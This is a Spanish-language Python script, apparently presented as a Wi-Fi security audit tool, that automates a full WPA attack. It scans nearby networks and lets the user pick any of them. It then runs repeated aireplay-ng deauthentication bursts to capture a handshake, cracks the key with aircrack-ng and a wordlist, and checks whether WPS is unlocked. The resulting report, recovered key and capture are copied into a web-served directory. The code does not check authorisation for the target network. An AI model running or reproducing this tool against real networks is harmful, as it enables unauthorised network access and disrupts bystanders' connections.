import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys, csv, re
from pathlib import Path
import subprocess, platform
import pandas as pd
import glob
import Password_Auditoria as PassAud

# --- CONFIGURACIÓN GLOBAL ---
INTERFACE = "wlan0"
OUTPUT_FILE = "redes_ordenadas.csv"
HANDSHAKE_TIMEOUT = "60s"  # Tiempo máximo para airodump-ng
WORDLIST = "password_comunes.txt"

def scan():
    print("\n" + "-" * 80 + "\n")
    print("\n\n" + "-" * 20 + "ANALISIS Y FORTALECIMIENTO DE LA SEGURIDAD EN REDES WIFI" + "-" * 20 + "\n\n")
    print("\n" + "-" * 80 + "\n")
    kill = os.system("sudo airmon-ng check kill")
    time.sleep(1)
    country = os.system("sudo iw reg set US")
    print("\n\n" + "-" * 30 + "Configurando Interfaz Wlan" + "-" * 30 + "\n\n")
    time.sleep(1)
    ptx = os.system("sudo iwconfig wlan0 txpower 50")
    time.sleep(1)
    down = os.system("sudo ip link set wlan0 down")
    time.sleep(1)
    monitor = os.system("sudo iw dev wlan0 set type monitor")
    time.sleep(1)
    up = os.system("sudo ip link set wlan0 up")
    time.sleep(1)
    print("\n" + "-" * 80 + "\n")
    print("\n\n" + "-" * 20 + "Confirmar Wlan0 Monitor" + "-" * 20 + "\n\n")
    print("\n" + "-" * 80 + "\n")


    iwconfig = os.system("iwconfig wlan0")
    time.sleep(2)
    rm1 = os.system("sudo rm scan*")
    print(f"{rm1}")
    time.sleep(2)
    print("\n" + "-" * 80 + "\n")
    print("\n\n" + "-" * 30 + "Escaneando" + "-" * 30 + "\n\n")
    print("\n" + "-" * 80 + "\n")
    scan = os.system("sudo timeout 40s airodump-ng --band abg wlan0 --write scan")
    print("\n" + "-" * 80 + "\n")
    time.sleep(2)


def analisis_scan():
    data = pd.read_csv("scan-01.csv", sep=',', engine='python')
    pd.set_option("display.max_rows", None)
    pd.set_option("display.max_columns", None)
    pd.set_option("display.width", None)
    #print(data)
    ordenado = [" ESSID", " Privacy", "BSSID", " channel", " Power", " Speed", " Cipher", " Authentication", " # beacons"]
    # Columnas EXACTAS como vienen en tu CSV (incluye espacios)
    cols = [" ESSID", " Privacy", "BSSID", " channel", " Power", " Speed", " Cipher", " Authentication", " # beacons"]
    # --- FILTRO PARA QUEDARTE SOLO CON LA TABLA DE APs ---
    # Mantener filas donde ESSID es un texto no vacío y distinto de 'None'
    mask_aps = (
            data[" ESSID"].notna()
            & data[" ESSID"].astype(str).str.strip().ne("")
            & data[" ESSID"].astype(str).str.strip().ne("None")
    )
    # (opcional) también evita líneas que son encabezado de la segunda tabla
    mask_no_stations_header = ~(
            data["BSSID"].astype(str).str.strip().eq("BSSID")
            | data["BSSID"].astype(str).str.contains(r"\(not associated\)", case=False, na=False)
    )
    filtro = mask_aps & mask_no_stations_header
    # Imprime solo APs (sin la sección Stations)
    print(data.loc[filtro, cols].head(200))
    # Devuelvo el DataFrame filtrado (para que lo use ordenar)
    return data.loc[filtro, cols]

def ordenar(df, archivo_salida="redes_ordenadas.csv"):
    essid_col = ' ESSID'
    df_ordenado = df.sort_values(by=essid_col, ascending=True)
    # Guardar solo las columnas originales
    df_ordenado[[" ESSID", " Privacy", "BSSID", " channel", " Power", " Speed", " Cipher", " Authentication", " # beacons"]].to_csv(
        archivo_salida, index=False
    )
    print(f"[OK] Guardado en {archivo_salida}")


# --- FUNCIÓN CLAVE PARA VISIBILIDAD DE ESTACIONES ---
def iniciar_captura_y_ataque(bssid, channel, output_file_base):
    airodump_cmd = [
        "sudo", "airodump-ng",
        "--bssid", bssid,
        "-c", channel,
        "--write", output_file_base,
        INTERFACE,
        "--ignore-negative-one"
    ]

    aireplay_cmd = [
        "sudo", "aireplay-ng",
        "-0", "30",
        "-a", bssid,  # MAC del Punto de Acceso (AP)
        INTERFACE
    ]
    print("\n" + "-" * 80 + "\n")
    print(f"\n[INFO] ---------------- INICIANDO CAPTURA Y ANALISIS ----------------")
    print(f"[CMD CAPTURA] {' '.join(airodump_cmd)}")
    print(f"[CMD ATAQUE ] {' '.join(aireplay_cmd)}")
    print(f"[INFO] Espere {HANDSHAKE_TIMEOUT}s. La visibilidad de STATION se forzará con ráfagas.")
    print("\n" + "-" * 80 + "\n")

    try:
        # PASO CRÍTICO 1: Ejecutar Airodump-ng en segundo plano
        airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Esperar un momento para que Airodump se estabilice antes de lanzar el ataque
        time.sleep(2)
        print("\n" + "-" * 80 + "\n")
        # PASO CRÍTICO 2: Ejecutar Aireplay-ng (ataque de desautenticación)
        print("[INFO] Primer Lanzando  paquetes de Desautenticación (mientras Airodump está activo)...")
        # El ataque de desautenticación es breve y rápido.
        subprocess.Popen(aireplay_cmd)
        time.sleep(40)
        print("\n" + "-" * 80 + "\n")
        print("[INFO] Segundo Lanzando  paquetes de Desautenticación (mientras Airodump está activo)...")
        subprocess.Popen(aireplay_cmd)
        time.sleep(50)
        print("\n" + "-" * 80 + "\n")
        print("[INFO] Tercer Lanzando  paquetes de Desautenticación (mientras Airodump está activo)...")
        subprocess.Popen(aireplay_cmd)
        # PASO CRÍTICO 3: Esperar el resto del tiempo de timeout para capturar cualquier Handshake tardío
        remaining_time = int(HANDSHAKE_TIMEOUT.replace('s', '')) - 5
        print(f"[INFO] Esperando {remaining_time}s para la captura final...")
        time.sleep(remaining_time)

    except Exception as e:
        print(f"[ERROR] Falló la ejecución de comandos: {e}")

    finally:
        # Asegurarse de terminar el proceso de Airodump-ng
        if 'airodump_proc' in locals() and airodump_proc.poll() is None:
            airodump_proc.terminate()
        print("\n[INFO] Captura y ataque finalizados.")
        print(f"[RESULTADO] Revise el archivo '{output_file_base}-01.cap' para verificar el Handshake.")


def seleccionar_y_auditar_ssid():
    """
       Carga el archivo de redes ordenadas, permite al usuario seleccionar una red para auditar,
       imprime sus detalles y prepara el archivo para la fase de ataque/captura.
       """
    try:
        # Cargar el archivo guardado y ordenado para la selección
        df_aps = pd.read_csv(OUTPUT_FILE, sep=',', engine='python', encoding='utf-8', skipinitialspace=True)
    except FileNotFoundError:
        print(
            f"[ERROR] No se encontró el archivo de redes ordenadas: {OUTPUT_FILE}. Ejecute el escaneo y ordenamiento primero.")
        return
    except Exception as e:
        print(f"[ERROR] Error al cargar {OUTPUT_FILE}: {e}")
        return

    # AÑADIR ESTA LÍNEA PARA ELIMINAR CUALQUIER ESPACIO RESIDUAL DEL ENCABEZADO
    # Y GARANTIZAR QUE EL ACCESO POSTERIOR FUNCIONE
    df_aps.columns = df_aps.columns.str.strip()

    if df_aps.empty:
        print("[ERROR] El archivo de redes ordenadas está vacío.")
        return

    # --- CORRECCIÓN CLAVE PARA IMPRIMIR TODO EL DATAFRAME ---
    pd.set_option('display.max_rows', None)
    pd.set_option('display.max_columns', None)
    pd.set_option('display.width', 1500)  # Aumentar el ancho de visualización
    pd.set_option('display.max_colwidth', None)
    # --------------------------------------------------------
    # 1. Mostrar las redes numeradas
    df_mostrar = df_aps.reset_index(drop=True)
    df_mostrar.index = df_mostrar.index + 1  # Empezar la numeración en 1
    print("\n" + "-" * 80 + "\n")
    print("\n\n************************************** REDES DISPONIBLES PARA AUDITORÍA **************************************")
    # Utilizamos nombres de columna SIN ESPACIOS aquí para evitar el KeyError
    print(df_mostrar[['ESSID', 'Privacy', 'BSSID', 'channel', 'Power']])
    print("****************************************************************************************************************")
    print("\n" + "-" * 80 + "\n")

    # 2. Solicitar selección del usuario
    while True:
        try:
            seleccion = input("\nIngrese el número de la red (ESSID) que desea auditar o 'q' para salir: ")
            if seleccion.lower() == 'q':
                print("Saliendo de la selección de auditoría.")
                #return
                os.system("sudo python3 Auditoria_WiFi.py")

            idx = int(seleccion)
            if 1 <= idx <= len(df_mostrar):
                # La selección es el índice menos 1 (porque el DataFrame es 0-indexado)
                red_seleccionada = df_mostrar.loc[idx]
                break
            else:
                print("Número no válido. Intente de nuevo.")
        except ValueError:
            print("Entrada no válida. Ingrese un número o 'q'.")

    # 3. Extraer detalles y crear el nombre del archivo de salida
    # Usando los nombres de columna limpios (sin espacios)
    ssid = red_seleccionada['ESSID'].strip()
    bssid = red_seleccionada['BSSID'].strip()
    channel = str(red_seleccionada['channel']).strip()
    privacy = red_seleccionada['Privacy'].strip()
    speed = str(red_seleccionada['Speed']).strip()

    # Crear nombre de archivo seguro: reemplaza caracteres especiales en el ESSID con guiones
    nombre_seguro_ssid = re.sub(r'[^a-zA-Z0-9]', '_', ssid) if ssid != '[OCULTO]' else 'OCULTO'
    output_file_base = f"{nombre_seguro_ssid}_{channel}.csv"
    output_audit_csv = f"{output_file_base}.csv"

    # 4. Imprimir los detalles de la red seleccionada
    print("\n****************************************************************************************************************")
    print(f"RED SELECCIONADA PARA AUDITORÍA")
    print("****************************************************************************************************************")
    print(f"ESSID (Nombre): {ssid}")
    print(f"BSSID (MAC AP): {bssid}")
    print(f"Canal (CH): {channel}")
    print(f"Protocolo (Privacy): {privacy}")
    print(f"Speed: {speed}Mbps")
    print(f"Archivo de Captura (Salida): {output_file_base.replace('.csv', '')}-01.cap")
    print("****************************************************************************************************************")
    print("\n" + "-" * 80 + "\n")


    # 5. Guardar la fila completa en el archivo de auditoría
    try:
        # Se guarda solo la fila seleccionada, filtrando por BSSID que es único
        df_aps[df_aps['BSSID'].str.strip() == bssid].to_csv(output_audit_csv, index=False)
        print(f"\n[OK] Datos de la red guardados en {output_audit_csv}")

        # 6. INICIAR LA CAPTURA Y EL ATAQUE (Llama a la función clave)
        iniciar_captura_y_ataque(bssid, channel, output_file_base)
        # INICIO DE MODIFICACIÓN: Devolvemos el nombre base del archivo
        return output_file_base
        # FIN DE MODIFICACIÓN

    except Exception as e:
        print(f"[ERROR] Falló el proceso de selección/guardado/captura: {e}")
        return None  # MODIFICADO

def buscar_password(output_file_base):
    """
    Ejecuta aircrack-ng con un diccionario, CAPTURA su salida con subprocess,
    y escribe el resultado en el archivo .txt.
    Esto soluciona el problema de la redirección de permisos (>) con sudo.
    """
    # Construimos el nombre del archivo .cap (asumiendo que es -01.cap)
    cap_file = f"{output_file_base}-01.cap"
    passwor_des = f"{output_file_base}-password.txt"

    # 1. Comando sin redirección (la salida va a stdout)
    desencriptar_cmd = [
        "sudo", "aircrack-ng",
        cap_file,
        "-w", WORDLIST
    ]

    print(f"\n[INFO] Iniciando cracking en {cap_file}...")
    print(f"[CMD] {' '.join(desencriptar_cmd)}")

    try:
        # 2. Ejecutar y capturar la salida (stdout)
        # Usamos check=False porque aircrack-ng a menudo devuelve un código de error (1)
        # incluso si encuentra la clave.
        result = subprocess.run(
            desencriptar_cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=8000  # 5 minutos para la prueba de cracking
        )

        # 3. Escribir el resultado capturado en el archivo .txt
        with open(passwor_des, 'w') as f:
            f.write(f"--- Análisis de {cap_file} ---\n")
            f.write(result.stdout)

        print(f"[OK] Intento de cracking finalizado. Resultados guardados en {passwor_des}")
        print("Revise este archivo para la clave (si se encuentra).")

    except subprocess.TimeoutExpired:
        print(f"[ERROR] Tiempo de cracking agotado ({8000} segundos). Intente con un diccionario más pequeño o más tiempo.")
    except Exception as e:
        print(f"[ERROR] Falló la ejecución de aircrack-ng: {e}")
        os.system("sudo python3 Auditoria_WiFi.py")

def extraer_clave_encontrada(password_log_path):
    """Extrae la clave WPA de la salida de aircrack-ng (formato log)."""
    if not Path(password_log_path).exists():
        return "CLAVE NO PROCESADA (LOG AUSENTE)"

    try:
        with open(password_log_path, 'r', encoding='utf-8') as f:
            content = f.read()

            # --- PATRÓN CORREGIDO Y MÁS ROBUSTO ---
            # Usa '.*?' (cualquier carácter, no-codicioso) para saltar sobre los códigos de control
            # de la terminal hasta encontrar el corchete de apertura.
            match = re.search(r'KEY\s*FOUND.*?\[(.*?)\]', content, re.IGNORECASE | re.DOTALL)

            if match:
                return f"{match.group(1).strip()} \nSEGURIDAD: INSEGURA. SE RECOMIENDA CAMBIAR."

            else:
                return f"CLAVE NO ENCONTRADA EN EL DICCIONARIO \nSEGURIDAD: ALTA. CUMPLE CON PROTOCOLO DE SEGURIDAD (dado el diccionario usado)."
    except Exception as e:
        return f"ERROR AL LEER LOG: {e}"

def auditar_wps(bssid_target):
    try:
        # 4. Imprimir y devolver el resultado
        print("\n" + "=" * 80 + "\n")
        print(f"\nANALIZANDO_WPS\n")
        print("\n" + "=" * 80 + "\n")


        # 1. Ejecutar el comando y guardar la salida
        os.system("sudo timeout 45s /usr/bin/wash -i wlan0 -2 -5 > resultados_wps.txt")
        time.sleep(1) # Pequeña pausa para asegurar que el archivo se ha escrito

        # 2. Leer la salida de wash y buscar el BSSID objetivo
        wps_status = "N/A (WPS NO DETECTADO)"
        wps_vulnerable = "NO DETECTADO (WPS deshabilitado o no anunciado), Es Seguro"
        bssid_formatted = bssid_target.strip().upper()

        with open("resultados_wps.txt", 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                # La salida de wash es tabular, buscamos la MAC (BSSID) en la línea
                if bssid_formatted in line.upper():
                    # Separar los campos (asumiendo espacios como delimitadores)
                    fields = line.split()

                    # Buscar el valor de WPS (WPS) y Bloqueo (Lck)
                    if len(fields) >= 7:
                        # Indexación aproximada basada en la salida de wash: [BSSID, Ch, dBm, WPS, Lck, Vendor, ESSID]
                        wps_version = fields[3].strip()
                        lck_status = fields[4].strip().upper()

                        if wps_version not in ('', 'N/A'):
                            wps_status = f"SI, versión {wps_version}.\n"
                        else:
                            wps_status = "NO DETECTADO (WPS deshabilitado o no anunciado), Es Seguro"
                        # Analizar el estado de bloqueo
                        if lck_status == 'NO':
                            wps_vulnerable = f"CRÍTICO. Es vulnerable a ataque de fuerza bruta (Lck: No). \nSe recomienda mantener protegido su AP ya que **puede ser comprometido mediante el botón físico (WPS)** si un atacante obtiene acceso al dispositivo."
                        else:
                            wps_vulnerable = "BAJA. La función de bloqueo está activa (Lck: Sí)."

                        # Salir tan pronto como se encuentre la línea
                        break

        return wps_status, wps_vulnerable

    except Exception as e:
        print(f"[ERROR WPS] Falló la auditoría de WPS: {e}")
        return "ERROR", "ERROR"

def generar_reporte_final(output_file_base, start_time_completo):
    """
    Lee los datos del CSV y el resultado del cracking y los consolida
    en un único archivo de auditoría.
    """
    # FIX 1: airodump-ng siempre crea un archivo con el sufijo -01.csv
    csv_filepath = f"{output_file_base}-01.csv"
    password_log_path = f"{output_file_base}-password.txt"

    if not Path(csv_filepath).exists():
        print(f"[ERROR] No se encontró el archivo de captura CSV: {csv_filepath}")
        return

    print(
        f"\n\n************************************** ANALIZANDO DATOS **************************************")
    print(f"[INFO] Leyendo archivo: {csv_filepath}")

    try:
        # --- PRE-PROCESAMIENTO PARA ENCONTRAR LÍNEAS DE ENCABEZADO ---
        with open(csv_filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        ap_header_line = -1
        station_header_line = -1

        for i, line in enumerate(lines):
            line = line.strip()
            if ap_header_line == -1 and line.startswith('BSSID,'):
                ap_header_line = i
            elif station_header_line == -1 and line.startswith('Station MAC,'):
                station_header_line = i
                break

        if ap_header_line == -1:
            print("[ERROR] No se pudo encontrar el encabezado de la tabla APs (BSSID).")
            return

        # --- 1. PROCESAR LA SECCIÓN DE ACCESS POINTS (APs) ---
        ap_header_names = [name.strip() for name in lines[ap_header_line].split(',') if name.strip()]
        ap_data_start_line = ap_header_line + 1
        num_ap_data_rows = station_header_line - ap_data_start_line if station_header_line != -1 else len(
            lines) - ap_data_start_line

        df_aps_data = pd.read_csv(
            csv_filepath,
            sep=',',
            encoding='utf-8',
            skipinitialspace=True,
            skiprows=ap_data_start_line,
            nrows=num_ap_data_rows,
            header=None,
            names=ap_header_names,
            engine='python'
        )

        AP_COLS = ['BSSID', 'First time seen', 'Last time seen', 'channel', 'Speed',
                   'Privacy', 'Cipher', 'Authentication', 'Power', '# beacons', 'ESSID']

        df_target_ap = df_aps_data[df_aps_data['BSSID'].notna()].iloc[0:1]
        ssid = df_target_ap['ESSID'].iloc[
            0].strip() if not df_target_ap.empty and 'ESSID' in df_target_ap.columns else "DESCONOCIDO"
        canal = df_target_ap['channel'].iloc[
            0].strip() if not df_target_ap.empty and 'channel' in df_target_ap.columns else "DESCONOCIDO"
        Authen = df_target_ap['Privacy'].iloc[
            0].strip() if not df_target_ap.empty and 'Privacy' in df_target_ap.columns else "DESCONOCIDO"

        #wps_status = auditar_wps(ssid)
        wps_status_info, wps_vulnerability_risk = auditar_wps(ssid)
        print(f"\n\n************************************** FINALIZANDO REPORTE DE AUDITORÍA **************************************")
        # --- 2. PROCESAR LA SECCIÓN DE ESTACIONES (STATIONS) ---
        df_stations_sorted = pd.DataFrame()
        if station_header_line != -1:
            station_header_names = [name.strip() for name in lines[station_header_line].split(',') if name.strip()]

            df_stations = pd.read_csv(
                csv_filepath,
                sep=',',
                encoding='utf-8',
                skipinitialspace=True,
                skiprows=station_header_line + 1,
                header=None,
                names=station_header_names,
                engine='python'
            )

            STATION_COLS = ['Station MAC', 'First time seen', 'Last time seen', 'Power',
                            '# packets', 'BSSID', 'Probed ESSIDs']

            df_stations = df_stations[df_stations['Station MAC'].notna()]
            df_stations_sorted = df_stations.sort_values(by='# packets', ascending=False).filter(items=STATION_COLS)

            # --- CONTEO DE ESTACIONES ---
            station_count = df_stations_sorted.shape[0]
            # --- 3. OBTENER CLAVE CRACKEADA ---
        clave_encontrada = extraer_clave_encontrada(password_log_path)

        # -------------------------------------------------------------
        # 2. CAPTURAR HORA DE FIN (Ahora es el fin de TODO el proceso)
        end_time = datetime.now()

        # 3. CALCULAR DURACIÓN TOTAL usando el tiempo pasado por el menú
        duration = end_time - start_time_completo

        # Formatear la duración para una mejor lectura
        tiempo_total_str = f"{duration.seconds // 3600:02d}h {duration.seconds % 3600 // 60:02d}m {duration.seconds % 60:02d}s"
        # -------------------------------------------------------------

        # --- 4. GENERAR REPORTE FINAL ---
        report_file = f"Auditoria_WiFi_SSID_{ssid}_Canal_{canal}.txt"

        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(f"REPORTE DE AUDITORÍA WI-FI: {ssid}\n")
            f.write("=" * 80 + "\n\n")

            # A. RESULTADO DEL CRACKING
            f.write(f"RESULTADO DEL CRACKING DE DICCIONARIO\n")
            f.write("-" * 80 + "\n")
            f.write(f"CLAVE ENCONTRADA: {clave_encontrada}\n")
            f.write("-" * 80 + "\n\n")

            # A. RESULTADO DEL WPS
            f.write(f"RESULTADO WPS\n")
            f.write("-" * 80 + "\n")
            f.write(f"WPS HABILITADO: {wps_status_info.strip()}\n")  # Usamos .strip() para remover el \n
            f.write(f"RIESGO: {wps_vulnerability_risk.strip()}\n")
            f.write("-" * 80 + "\n\n")

            if Authen == 'WPA3':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: ALTO (WPA3)\nCONSEJO: Excelente nivel de seguridad. Asegúrese de que el router esté configurado con el cifrado más robusto (CCMP/AES).\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'WPA3 WPA2':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: MEDIO-ALTO (WPA2)\nCONSEJO: Aceptable, Se recomienda migrar a solo WPA3 para protección contra ataques.\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'WPA2':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: MEDIO-ALTO (WPA2)\nCONSEJO: Aceptable, Se recomienda migrar a WPA3 para protección contra ataques.\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'WPA2 WPA':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: BAJO (WPA)\nCONSEJO: Protocolo obsoleto y vulnerable (TKIP). Debe migrar urgentemente a solo WPA2-AES o, preferiblemente, a WPA3.\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'WPA':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: BAJO (WPA)\nCONSEJO: Protocolo obsoleto y vulnerable (TKIP). Debe migrar urgentemente a WPA2-AES o, preferiblemente, a WPA3.\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'OPN':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: CRÍTICO (Abierta)\nCONSEJO: SIN CIFRADO. Toda la información es transmitida en texto plano. Implementación inmediata de WPA3 es fundamental.\n")
                f.write("-" * 80 + "\n\n")

            elif Authen == 'WEP':
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} NIVEL: CRÍTICO (WEP))\nCONSEJO: Protocolo críticamente inseguro. La clave es trivialmente descifrable. ¡Migración inmediata a WPA3 es obligatoria!\n")
                f.write("-" * 80 + "\n\n")

                # --- CONDICIÓN PARA PROTOCOLOS NO RECONOCIDOS ---
            else:
                f.write(f"RESULTADO DE PROTOCOLO DE SEGURIDAD\n")
                f.write("-" * 80 + "\n")
                f.write(f"{Authen} CONSEJO DE AUDITORÍA: Protocolo de autenticación no reconocido o no listado. Se requiere revisión manual de la tabla APs.\n")
                f.write("-" * 80 + "\n\n")

            # B. DETALLES DEL PUNTO DE ACCESO
            f.write("INFORMACIÓN DEL PUNTO DE ACCESO (AP)\n")
            f.write("-" * 80 + "\n")
            # Usar to_string para una salida legible de Pandas
            f.write(df_target_ap.filter(items=AP_COLS).to_string(index=False))
            f.write("\n\n")

            # C. DETALLES DE ESTACIONES
            f.write(f"CANTIDAD DE DISPOSITIVOS (CLIENTES) CONECTADOS: {station_count}\n")
            f.write("-" * 80 + "\n")
            if not df_stations_sorted.empty:
                f.write(df_stations_sorted.to_string(index=False))
            else:
                f.write("No se detectaron dispositivos conectados durante el período de captura.\n")
            f.write("\n")

            # 5. AGREGAR TIEMPOS DE EJECUCIÓN AL FINAL DEL REPORTE
            f.write("\n" + "=" * 80 + "\n")
            f.write("MÉTRICAS DE EFICIENCIA DE LA AUDITORÍA\n")
            f.write("=" * 80 + "\n")
            # Usamos el start_time_completo
            f.write(f"Hora de Inicio de la Auditoría: {start_time_completo.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Hora de Finalización de Auditoría: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duración Total del Proceso: {tiempo_total_str}\n")
            f.write("=" * 80 + "\n")
            # -------------------------------------------------------------

        passwor_des = f"{output_file_base}-password.txt"
        capt_cap = f"{output_file_base}-01.cap"
        time.sleep(1)
        os.system(f"cp {passwor_des} Password_WiFi_SSID_{ssid}_Canal_{canal}.csv")
        time.sleep(1)
        os.system(f"cp redes_ordenadas.csv Todas_las_Redes_WiFi_Encontradas_SSID_{ssid}_Canal_{canal}.csv")
        time.sleep(1)
        os.system(f"cp {capt_cap} Password_WiFi_SSID_{ssid}_Canal_{canal}.pcap")
        time.sleep(1)
        os.system(f"sudo rm {output_file_base}*")
        os.system(f"sudo rm resultados_wps*")
        os.system(f"sudo rm scan*")

        print("\n" + "-" * 80 + "\n")
        print(f"[OK] Reporte final consolidado generado exitosamente en: {report_file}")
        print("\n" + "-" * 80 + "\n")

        # =============================================================
        # === NUEVA SECCIÓN: IMPRIMIR EL REPORTE COMPLETO EN PANTALLA ===
        # =============================================================
        print("\n" + "=" * 80)
        print(f"INICIO DE REPORTE FINAL DE AUDITORÍA: {ssid}")
        print("=" * 80 + "\n")

        try:
            # Leer el contenido del archivo recién creado e imprimirlo
            with open(report_file, 'r', encoding='utf-8') as f_read:
                print(f_read.read())
                os.system(f"sudo cp {report_file} /var/www/html/results/{report_file}")

        except Exception as read_e:
            print(f"\n[ERROR] No se pudo leer el reporte final para mostrarlo en pantalla: {read_e}")
            os.system("sudo python3 Auditoria_WiFi.py")

        print("\n" + "=" * 80)
        print("      FIN DEL REPORTE")
        print("=" * 80 + "\n")
        # =============================================================



    except Exception as e:
        print(f"[ERROR] Falló la generación del reporte final: {e}")
        print(f"[DEBUG] Posible cambio de Canal WiFi, Revise si el ESSID se extrajo correctamente o si el formato del CSV ha cambiado, Se recomienda Opcion 1 [INICIAR ESCANEO].")
        os.system(f"sudo rm {output_file_base}*")
        os.system(f"sudo rm resultados_wps*")
        os.system("sudo python3 Auditoria_WiFi.py")


# --- EJECUCIÓN PRINCIPAL ---


def menu():
    #print("1. [INICIAR ESCANEO] Ejecutar Airodump-ng y generar lista de redes.")
    #print("2. [REANUDAR] Omitir escaneo y pasar directamente a la selección de red.")
    #menu_opt = input()
    print("\n" + "=" * 80)
    print("MENÚ PRINCIPAL DE AUDITORÍA WI-FI")
    print("=" * 80 + "\n")
    print("1. [INICIAR ESCANEO] Ejecutar Airodump-ng y generar lista de redes.")
    print("2. [REANUDAR] Omitir escaneo y pasar directamente a la selección de red.")
    print("-" * 80)
    menu_opt = input("Seleccione una opción: ")

    if menu_opt == '1' or menu_opt == '2':
        # --- CAPTURA DE TIEMPO DE INICIO DE LA AUDITORÍA COMPLETA ---
        hora_inicio_auditoria = datetime.now()

        if menu_opt == '1':
            try:
                # --- NUEVA PREGUNTA: SELECCIÓN DE WORDLIST ---
                while True:
                    list_choice = input("\n¿Desea generar una lista de contraseñas extendida (Ingeniería Social) o continuar con el diccionario básico? (E/B): ").lower()
                    if list_choice in ('e', 'b'):
                        break
                    print("Opción no válida. Por favor, ingrese 'E' para Extendida o 'B' para Básica.")

                # Si el usuario elige Extendida (E), ejecutamos el generador
                if list_choice == 'e':
                    print("\n[INFO] Iniciando el generador de contraseñas por Ingeniería Social...")
                    # Ejecutamos el script de generación.
                    # Esto llenará/actualizará el archivo 'password_comunes.txt' (asumiendo tu lógica final).

                    #os.system("sudo python3 Password_Auditoria.py")
                    PassAud.main()
                    print("\n[INFO] Generación finalizada. Continuando con la auditoría usando el diccionario actualizado.")
                else:
                    print("\n[INFO] Continuando con la auditoría usando el diccionario básico ('password_comunes.txt').")
                    os.system("cp password_personalizados.txt password_comunes.txt")

                # -----------------------------------------------
                # 1. ESCANEO Y ANÁLISIS DE REDES
                scan()
                df_analisis = analisis_scan()

                # 2. ORDENAR Y GUARDAR RESULTADOS COMPLETOS (alfabético)
                if not df_analisis.empty:
                    ordenar(df_analisis)

                    # 3. SELECCIÓN INTERACTIVA DE LA RED PARA AUDITAR (Carga desde el archivo guardado)
                    file_base = seleccionar_y_auditar_ssid()  # <-- MODIFICADO: Captura el valor devuelto

                    # 4. CRACKING MANUAL (solo si la selección fue exitosa)
                    if file_base:  # <-- MODIFICADO: Asegura que la captura haya sido seleccionada
                        buscar_password(file_base)  # <-- MODIFICADO: Pasa el argumento requerido
                        generar_reporte_final(file_base, hora_inicio_auditoria)
                        menu()

            except Exception as e:
                print(f"[ERROR] Falló la generación del reporte final: {e}")
                print("\nReiniciando\n")
                os.system("sudo python3 Auditoria_WiFi.py")

        elif menu_opt == '2':
            try:
                os.system("cp password_personalizados.txt password_comunes.txt")
                # 3. SELECCIÓN INTERACTIVA DE LA RED PARA AUDITAR (Carga desde el archivo guardado)
                file_base = seleccionar_y_auditar_ssid()  # <-- MODIFICADO: Captura el valor devuelto


                # 4. CRACKING MANUAL (solo si la selección fue exitosa)
                if file_base:  # <-- MODIFICADO: Asegura que la captura haya sido seleccionada
                    buscar_password(file_base)  # <-- MODIFICADO: Pasa el argumento requerido
                    generar_reporte_final(file_base, hora_inicio_auditoria)
                    menu()

            except Exception as e:
                print(f"[ERROR] Falló la generación del reporte final: {e}")
                print("\nReiniciando\n")
                os.system("sudo python3 Auditoria_WiFi.py")

    else:
        print("Error de Dato")
        menu()
menu()
